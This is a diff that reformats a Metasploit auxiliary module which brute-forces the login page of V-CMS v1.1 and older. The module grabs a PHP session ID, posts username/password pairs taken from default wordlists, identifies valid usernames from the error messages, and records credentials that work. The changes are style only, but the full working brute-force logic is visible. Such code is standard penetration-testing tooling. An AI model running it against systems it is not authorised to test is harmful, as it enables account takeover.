@@ -10,39 +10,48 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'V-CMS Login Utility',
-      'Description'    => %q{
-        This module attempts to authenticate to an English-based V-CMS login interface. It
-        should only work against version v1.1 or older, because these versions do not have
-        any default protections against brute forcing.
-      },
-      'Author'         => [ 'sinn3r' ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'V-CMS Login Utility',
+        'Description' => %q{
+          This module attempts to authenticate to an English-based V-CMS login interface. It
+          should only work against version v1.1 or older, because these versions do not have
+          any default protections against brute forcing.
+        },
+        'Author' => [ 'sinn3r' ],
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
-        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+        OptPath.new('USERPASS_FILE', [
+          false, 'File containing users and passwords separated by space, one pair per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
+        ]),
+        OptPath.new('USER_FILE', [
+          false, 'File containing users, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')
+        ]),
+        OptPath.new('PASS_FILE', [
+          false, 'File containing passwords, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
+        ]),
         OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])
-      ])
+      ]
+    )
   end
-
 
   def get_sid
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => @uri
+      'uri' => @uri
     })
 
     # Get the PHP session ID
     m = res.get_cookies.match(/(PHPSESSID=.+);/)
-    id = (m.nil?) ? nil : m[1]
+    id = m.nil? ? nil : m[1]
 
     return id
   end
@@ -78,17 +87,17 @@ class MetasploitModule < Msf::Auxiliary
     begin
       sid = get_sid
       if sid.nil?
-        vprint_error("Failed to get sid")
+        vprint_error('Failed to get sid')
         return :abort
       end
 
       res = send_request_cgi({
-        'uri'    => "#{@uri}process.php",
+        'uri' => "#{@uri}process.php",
         'method' => 'POST',
         'cookie' => sid,
         'vars_post' => {
-          'user'     => user,
-          'pass'     => pass,
+          'user' => user,
+          'pass' => pass,
           'sublogin' => '1'
         }
       })
@@ -99,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => sid
       })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      vprint_error("Service failed to respond")
+      vprint_error('Service failed to respond')
       return :abort
     end
 
@@ -115,9 +124,9 @@ class MetasploitModule < Msf::Auxiliary
         return :skip_user
       when /Invalid password/
         vprint_status("Username found: #{user}")
-      when /\<a href="process\.php\?logout=1"\>/
+      when /<a href="process\.php\?logout=1">/
         print_good("Successful login: \"#{user}:#{pass}\"")
-        report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.body)
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
         return :next_user
       end
     end
@@ -127,15 +136,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @uri = normalize_uri(target_uri.path)
-    @uri << "/" if @uri[-1, 1] != "/"
+    @uri << '/' if @uri[-1, 1] != '/'
 
     super
   end
 
-  def run_host(ip)
-    each_user_pass { |user, pass|
+  def run_host(_ip)
+    each_user_pass do |user, pass|
       vprint_status("Trying \"#{user}:#{pass}\"")
       do_login(user, pass)
-    }
+    end
   end
 end
